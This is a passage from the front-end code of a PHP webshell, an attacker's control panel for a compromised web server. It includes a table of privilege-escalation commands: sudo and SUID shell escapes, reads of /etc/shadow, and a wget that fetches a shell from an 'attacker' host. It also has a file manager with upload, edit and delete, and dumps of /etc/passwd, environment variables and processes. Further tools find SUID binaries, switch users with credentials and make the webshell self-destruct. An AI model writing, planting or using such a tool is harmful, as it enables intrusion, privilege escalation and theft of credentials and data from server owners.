    {name:'taskset',cats:['sudo','suid'],cmds:{sudo:'sudo taskset 1 /bin/sh',suid:'./taskset 1 /bin/sh -p'}},
    {name:'tee',cats:['file-write','suid'],cmds:{'file-write':'echo "data" | tee /target',suid:'echo "data" | ./tee /target'}},
    {name:'time',cats:['sudo','suid'],cmds:{sudo:'sudo /usr/bin/time /bin/sh',suid:'./time /bin/sh'}},
    {name:'tmux',cats:['sudo'],cmds:{sudo:'sudo tmux'}},
    {name:'vi',cats:['sudo','suid'],cmds:{sudo:'sudo vi -c \':!/bin/sh\'',suid:'./vi -c \':!/bin/sh\''}},
    {name:'vim',cats:['sudo','suid'],cmds:{sudo:'sudo vim -c \':!/bin/sh\'',suid:'./vim -c \':!/bin/sh\''}},
    {name:'watch',cats:['sudo','suid'],cmds:{sudo:'sudo watch -x sh -c \'reset; exec sh 1>&0 2>&0\'',suid:'./watch -x sh -c \'reset; exec sh 1>&0 2>&0\''}},
    {name:'wget',cats:['file-read','file-write','sudo'],cmds:{'file-read':'wget -q -O- file:///etc/shadow','file-write':'wget http://attacker/shell -O /target',sudo:'sudo wget -q -O- file:///etc/shadow'}},
    {name:'xargs',cats:['sudo','suid'],cmds:{sudo:'sudo xargs -a /dev/null sh',suid:'./xargs -a /dev/null sh -p'}},
    {name:'xxd',cats:['file-read','suid'],cmds:{'file-read':'xxd /etc/shadow | xxd -r',suid:'./xxd /etc/shadow | xxd -r'}},
    {name:'zip',cats:['sudo','suid'],cmds:{sudo:'TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT \'sh #\'\nsudo rm $TF',suid:'TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT \'sh #\'\nrm $TF'}},
    {name:'zsh',cats:['sudo','suid'],cmds:{sudo:'sudo zsh',suid:'zsh'}},
];

function filterGtfo() { renderGtfoGrid(); }
function searchGtfo() {
    activeGtfoFilter = $('gtfo-filter').value;
    renderGtfoGrid();
}
function renderGtfoGrid() {
    const search = ($('gtfo-search') ? $('gtfo-search').value : '').toLowerCase();
    const filter = $('gtfo-filter') ? $('gtfo-filter').value : 'all';
    const grid = $('gtfo-grid');
    let html = '';
    GTFO_DATA.forEach(g => {
        if (search && !g.name.toLowerCase().includes(search)) return;
        if (filter !== 'all' && !g.cats.includes(filter)) return;
        const badges = g.cats.map(c => {
            const colors = {'suid':'orange','sudo':'green','capabilities':'purple','reverse-shell':'red','file-read':'blue','file-write':'blue'};
            return '<span class="badge badge-' + (colors[c]||'blue') + '">' + c + '</span>';
        }).join(' ');
        if (expandedGtfo === g.name) {
            let cmdsHtml = '';
            for (const [cat, cmd] of Object.entries(g.cmds)) {
                const ip = $('rs-ip') ? $('rs-ip').value : '10.10.14.1';
                const port = $('rs-port') ? $('rs-port').value : '4444';
                const replaced = cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
                cmdsHtml += '<div style="margin-top:8px"><span class="badge badge-green">' + cat + '</span><div class="code-box" style="margin-top:4px;font-size:11px" onclick="event.stopPropagation();copyText(this.textContent)">' + esc(replaced) + '</div></div>';
            }
            html += '<div class="gtfo-card" style="border-color:var(--accent)" onclick="expandedGtfo=null;renderGtfoGrid();"><strong>' + esc(g.name) + '</strong><div class="badges" style="margin-top:4px">' + badges + '</div>' + cmdsHtml;
            html += '<button class="btn btn-sm" style="margin-top:8px" onclick="event.stopPropagation();expandedGtfo=null;renderGtfoGrid();">Collapse</button></div>';
        } else {
            html += '<div class="gtfo-card" onclick="expandGtfo(\'' + esc(g.name) + '\')"><strong>' + esc(g.name) + '</strong><div class="badges" style="margin-top:4px">' + badges + '</div></div>';
        }
    });
    grid.innerHTML = html || '<p style="color:var(--text-dim);grid-column:1/-1">No matching binaries found.</p>';
}
function expandGtfo(name) { expandedGtfo = name; renderGtfoGrid(); }
renderGtfoGrid();

// ===== FILE MANAGER =====
async function loadFileManager(path) {
    fmCurrentPath = path;
    const data = await apiJson({action:'filemanager', path});
    if (data.error) { toast(data.error, 'error'); return; }
    fmCurrentPath = data.path;
    var isWinPath = data.path.length >= 2 && data.path[1] === ':';
    var bc = isWinPath ? '' : '<span onclick="loadFileManager(\'/\')">/</span>';
    var parts = data.path.split(/[\/\\]/).filter(Boolean);
    var acc = '';
    for (var pi = 0; pi < parts.length; pi++) {
        var p = parts[pi];
        acc += (pi === 0 && isWinPath ? '' : (isWinPath ? '\\' : '/')) + p;
        bc += ' ' + (isWinPath ? '\\' : '/') + ' <span onclick="loadFileManager(\'' + escJs(acc) + '\')">' + esc(p) + '</span>';
    }
    $('fm-breadcrumb').innerHTML = bc;
    let html = '<table class="fm-table"><thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead><tbody>';
    data.items.sort((a,b) => {
        if (a.name === '..') return -1;
        if (b.name === '..') return 1;
        if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
        return a.name.localeCompare(b.name);
    }).forEach(f => {
        const icon = f.is_dir ? '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#d29922" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>' : '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--text-secondary)" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
        html += '<tr>';
        html += '<td><div class="fname" onclick="' + (f.is_dir ? "loadFileManager('" + escJs(f.path) + "')" : "fmViewFile('" + escJs(f.path) + "')") + '">' + icon + ' ' + esc(f.name) + '</div></td>';
        html += '<td style="color:var(--text-secondary);font-size:12px">' + (f.is_dir ? '-' : formatBytes(f.size)) + '</td>';
        html += '<td style="font-family:var(--font-mono);font-size:12px;color:' + (f.writable ? 'var(--green)' : 'var(--text-dim)') + '">' + f.perms + '</td>';
        html += '<td style="color:var(--text-secondary);font-size:12px">' + f.mtime + '</td>';
        html += '<td style="white-space:nowrap">';
        if (f.name !== '..') {
            html += '<button class="btn btn-sm" onclick="fmRename(\'' + escJs(f.path) + '\',\'' + escJs(f.name) + '\')">Ren</button> ';
            html += '<button class="btn btn-sm btn-danger" onclick="fmDelete(\'' + escJs(f.path) + '\',\'' + escJs(f.name) + '\')">Del</button> ';
            if (!f.is_dir) html += '<a class="btn btn-sm" href="?download=' + encodeURIComponent(f.path) + '" style="text-decoration:none">DL</a>';
        }
        html += '</td></tr>';
    });
    html += '</tbody></table>';
    $('fm-content').innerHTML = html;
}
async function fmViewFile(path) { const data = await apiJson({action:'fileaction',type:'read',path}); editingFile = path; $('edit-modal-title').textContent = 'Edit: ' + path.split(/[\/\\]/).pop(); $('edit-content').value = data.content || ''; $('edit-modal').classList.add('show'); }
async function fmDelete(path, name) { if (!confirm('Delete ' + name + '?')) return; await apiJson({action:'fileaction',type:'delete',path}); loadFileManager(fmCurrentPath); }
async function fmRename(path, name) { const n = prompt('New name:', name); if (!n) return; await apiJson({action:'fileaction',type:'rename',path,newname:n}); loadFileManager(fmCurrentPath); }
async function fmMkdir() { const n = prompt('Folder name:'); if (!n) return; await apiJson({action:'fileaction',type:'mkdir',path:fmCurrentPath+'/'+n}); loadFileManager(fmCurrentPath); }

function closeEditModal() { $('edit-modal').classList.remove('show'); }
async function saveEdit() {
    const content = $('edit-content').value;
    const data = await apiJson({action:'fileaction',type:'write',path:editingFile,content});
    if (data.ok) {
        closeEditModal(); toast('File saved!'); loadFileManager(fmCurrentPath);
    } else { toast('Failed to save', 'error'); }
}

async function fmUpload() {
    const file = $('fm-upload').files[0];
    if (!file) return;
    const fd = new FormData();
    fd.append('upload', file);
    fd.append('upload_path', fmCurrentPath);
    const r = await fetch(window.location.href, { method:'POST', body:fd });
    const data = await r.json();
    if (data.ok) { toast('Uploaded: ' + data.name); loadFileManager(fmCurrentPath); }
    else toast('Upload failed', 'error');
    $('fm-upload').value = '';
}

// ===== SYSTEM INFO =====
async function loadSysinfo() {
    const body = $('sysinfo-body');
    body.innerHTML = '<p style="color:var(--text-dim)">Loading...</p>';
    const info = await apiJson({action:'sysinfo'});
    let html = '<div class="grid-2">';
    const fields = [
        {label:'OS',key:'os'},{label:'Kernel',key:'kernel'},{label:'Hostname',key:'hostname'},
        {label:'User',key:'user'},{label:'UID/Privileges',key:'uid'},{label:'Groups',key:'groups'},
        {label:'IP Addresses',key:'ip_addrs'},{label:'Uptime',key:'uptime'},{label:'Disk',key:'disk'},
        {label:'PHP Version',key:'php_ver'},{label:'Server',key:'server_software'},
        {label:'Disabled Functions',key:'php_disabled'}
    ];
    fields.forEach(f => {
        if (info[f.key]) {
            html += '<div class="card"><h3 style="margin-bottom:8px;font-size:14px">' + esc(f.label) + '</h3><div class="code-box" onclick="copyText(this.textContent)">' + esc(info[f.key]) + '</div></div>';
        }
    });
    html += '</div>';
    html += '<div style="margin-top:16px;display:flex;gap:8px">';
    html += '<button class="btn btn-primary" onclick="findSuid()">Find SUID / Privesc</button>';
    html += '<button class="btn" onclick="findWritable()">Find Writable Dirs</button>';
    html += '</div>';
    if (info.env) html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">Environment</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.env) + '</div></div>';
    if (info.passwd && info.passwd !== 'N/A on Windows') html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">/etc/passwd</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.passwd) + '</div></div>';
    if (info.processes) html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">Processes</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.processes) + '</div></div>';
    if (info.crontab) html += '<div class="card" style="margin-top:16px"><h3 style="margin-bottom:8px;font-size:14px">Scheduled Tasks</h3><div class="code-box" onclick="copyText(this.textContent)" style="max-height:300px">' + esc(info.crontab) + '</div></div>';
    body.innerHTML = html;
}
async function findSuid() {
    const body = $('sysinfo-body');
    body.innerHTML = '<p style="color:var(--text-dim)">Searching...</p>';
    const data = await apiJson({action:'find_suid'});
    body.innerHTML = '<h3 style="margin-bottom:12px">SUID / Privilege Escalation</h3><div class="code-box">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
}
async function findWritable() {
    const body = $('sysinfo-body');
    body.innerHTML = '<p style="color:var(--text-dim)">Searching...</p>';
    const data = await apiJson({action:'find_writable'});
    body.innerHTML = '<h3 style="margin-bottom:12px">Writable Directories</h3><div class="code-box">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
}

// ===== NETWORK TOOLS =====
async function netTool(tool) {
    const target = $('net-target').value.trim();
    if (!target && tool !== 'arp') { toast('Enter a target', 'error'); return; }
    $('net-output').textContent = 'Running...';
    const data = await apiJson({action:'nettool', tool, target});
    $('net-output').textContent = data.result || 'No output';
}

// ===== USER SWITCH =====
async function doSwitchUser() {
    var user = $('su-username').value.trim();
    var pass = $('su-password').value;
    var status = $('su-status');
    if (!user) { status.textContent = 'Enter a username.'; status.style.color = 'var(--red)'; return; }
    status.textContent = 'Testing credentials...'; status.style.color = 'var(--text-secondary)';
    try {
        var data = await apiJson({action:'switch_user', su_user:user, su_pass:pass});
        if (data.ok) {
            status.textContent = 'Switched to ' + data.user; status.style.color = 'var(--green)';
            $('su-current').textContent = data.user;
            suUser = data.user;
            updateInputPrompt();
            termWriteLine('<span style="color:#3fb950">Switched to user: ' + esc(data.user) + '</span>');
        } else {
            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
        }
    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
}
async function doResetUser() {
    var status = $('su-status');
    status.textContent = 'Resetting...'; status.style.color = 'var(--text-secondary)';
    try {
        var data = await apiJson({action:'switch_user', su_user:'', su_pass:''});
        if (data.ok) {
            status.textContent = 'Back to ' + data.user; status.style.color = 'var(--green)';
            $('su-current').textContent = data.user;
            suUser = '';
            updateInputPrompt();
            $('su-username').value = ''; $('su-password').value = '';
            termWriteLine('<span style="color:#3fb950">Switched back to default user: ' + esc(data.user) + '</span>');
        } else {
            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
        }
    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
}

// ===== SETTINGS =====
async function selfDestruct() {
    if (!confirm('DANGER: This will permanently delete this webshell! Are you sure?')) return;
    const mins = $('sd-minutes').value;
    const data = await apiJson({action:'self_destruct', minutes: mins});
    toast(data.msg, data.ok ? 'success' : 'error');
}

// Clock
function updateClock() {
    const now = new Date();
    const el = $('clock');
    if (el) el.textContent = now.toLocaleTimeString('en-GB', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
updateClock(); setInterval(updateClock, 1000);

(function() {
    var el = $('env-terminal-mode');
    if (el) el.textContent = 'Inline terminal (standalone)';
})();

// CWD property defined at top with auto-update of topbar + prompt

// GTFOBins: add data attributes for colored left borders
function addGtfoDataAttrs() {
    document.querySelectorAll('.gtfo-card').forEach(card => {
        const badges = card.querySelector('.badges');
        if (!badges) return;
        const text = badges.textContent;
        if (text.includes('reverse-shell')) card.setAttribute('data-has-revshell','');
        else if (text.includes('suid')) card.setAttribute('data-has-suid','');
        else if (text.includes('sudo')) card.setAttribute('data-has-sudo','');
    });
}
var _origRenderGtfo = renderGtfoGrid;
renderGtfoGrid = function() { _origRenderGtfo(); addGtfoDataAttrs(); };
renderGtfoGrid();

var envTermEl = $('env-terminal-mode');
if (envTermEl) envTermEl.textContent = 'Inline terminal (standalone)';
</script>

<!-- PHP detection for main app -->
<span id="php-check-main" style="display:none"><?php echo 'PHP_OK'; ?></span>
<script>
(function(){
    var c = document.getElementById('php-check-main');
    if (!c || c.textContent.trim() !== 'PHP_OK') {
        document.body.innerHTML = '<div style="position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:99999"><div style="background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:520px;text-align:center"><h2 style="color:#f85149;margin-bottom:12px">PHP Not Executing</h2><p style="color:#8b949e;font-size:14px;margin-bottom:16px">This file is being served as plain text. PHP is not processing it.</p><p style="color:#d29922;font-size:13px;margin-bottom:12px;font-weight:600">Create a .htaccess file in the same directory with:</p><code style="display:block;background:#0d1117;padding:12px;margin:8px 0;border-radius:8px;font-size:12px;text-align:left;color:#e6edf3;white-space:pre;overflow-x:auto">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code><p style="color:#8b949e;font-size:12px;margin-top:8px">If that doesn\'t work, try CGI mode:</p><code style="display:block;background:#0d1117;padding:8px;margin:4px 0;border-radius:6px;font-size:12px;text-align:left;color:#e6edf3">Options +ExecCGI\nAddHandler cgi-script .php</code></div></div>';
    }
})();
</script>
</body></html>